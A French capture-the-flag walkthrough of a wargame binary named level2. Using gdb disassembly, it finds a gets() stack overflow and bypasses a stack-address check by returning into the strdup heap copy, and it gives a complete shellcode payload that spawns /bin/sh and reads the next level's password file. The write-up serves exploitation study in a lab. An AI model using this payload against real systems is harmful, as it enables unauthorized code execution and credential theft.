# Level2

On observe un exécutable à la racine : `level2`

```shell
$ ./level2
Hello World
Hello World

$ python -c 'print "A"*100' | ./level2
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

On cherche donc à comprendre ce que fait l'exécutable

```shell
$ gdb level2 -q
Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x0804853f <+0>:     push   ebp
   0x08048540 <+1>:     mov    ebp,esp
   0x08048542 <+3>:     and    esp,0xfffffff0
   0x08048545 <+6>:     call   0x80484d4 <p>
   0x0804854a <+11>:    leave
   0x0804854b <+12>:    ret
End of assembler dump.
(gdb) disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:     push   ebp
   0x080484d5 <+1>:     mov    ebp,esp
   0x080484d7 <+3>:     sub    esp,0x68
   0x080484da <+6>:     mov    eax,ds:0x8049860
   0x080484df <+11>:    mov    DWORD PTR [esp],eax
   0x080484e2 <+14>:    call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:    lea    eax,[ebp-0x4c]
   0x080484ea <+22>:    mov    DWORD PTR [esp],eax
   0x080484ed <+25>:    call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:    mov    eax,DWORD PTR [ebp+0x4]
   0x080484f5 <+33>:    mov    DWORD PTR [ebp-0xc],eax
   0x080484f8 <+36>:    mov    eax,DWORD PTR [ebp-0xc]
   0x080484fb <+39>:    and    eax,0xb0000000
   0x08048500 <+44>:    cmp    eax,0xb0000000
   0x08048505 <+49>:    jne    0x8048527 <p+83>
   0x08048507 <+51>:    mov    eax,0x8048620
   0x0804850c <+56>:    mov    edx,DWORD PTR [ebp-0xc]
   0x0804850f <+59>:    mov    DWORD PTR [esp+0x4],edx
   0x08048513 <+63>:    mov    DWORD PTR [esp],eax
   0x08048516 <+66>:    call   0x80483a0 <printf@plt>
   0x0804851b <+71>:    mov    DWORD PTR [esp],0x1
   0x08048522 <+78>:    call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:    lea    eax,[ebp-0x4c]
   0x0804852a <+86>:    mov    DWORD PTR [esp],eax
   0x0804852d <+89>:    call   0x80483f0 <puts@plt>
   0x08048532 <+94>:    lea    eax,[ebp-0x4c]
   0x08048535 <+97>:    mov    DWORD PTR [esp],eax
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:   leave
   0x0804853e <+106>:   ret
End of assembler dump.
```

On va utiliser `Cutter` pour avoir une idée plus claire de `level2`

```shell
$ scp -P 4242 -r level2@192.168.56.102:/home/user/level2/level2 .

$ ./Cutter-v2.1.2-Linux-x86_64.AppImage level2
```

_résultat sauvegardé dans [source.md](source.md)_

Nous avons `76(src) + 4(EBP) = 80` de disponible

Ce qui nous laisse assez de place pour effectuer un `Buffer Overflow`

sachant que le shellcode fait `45` caracteres, il nous reste `80 - 45 = 35`

On se retrouve avec

```shell
$ python -c 'print "\x90"*35 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'
```

Mais pour l'instant nous n'avons pas l'EIP qui pointe vers l'un des `NOP` (`\x90`) et ne commençant pas par `0xb` car notre shellcode est stocké sur la stack, ce qui valide la condition `eax == 0xb0000000` après le `AND`.

On va se servir du `strdup(&src)` qui copie notre chaîne de caractères en mémoire mais cette fois sur la `heap`.

On regarde donc le retour de `strdup` pour trouver l'adresse vers laquelle pointer.

```shell
$ gdb level2 -q
Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) break *p+105
Breakpoint 1 at 0x804853d
(gdb) run <<< $(python -c 'print "\x90"*35 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
...
Breakpoint 1, 0x0804853d in p ()
(gdb) i r eax
eax            0x804a008    134520840
```

Enfin nous pouvons ajouter l'adresse de retour du `strdup` qui pointe sur notre string mais pas sur la stack pour contourner le `if`

**Ne pas oublier d'inverser l'adresse** `0x804a008 => "\x08\xa0\x04\x08"`

```shell
$ (python -c 'print "\x90"*35 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x08\xa0\x04\x08"'; cat ) | ./level2
������������������������������������^�1��F�F
                                            �
                                             ���V
                                                 1�����/bin/s�
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
Ctrl+D
```
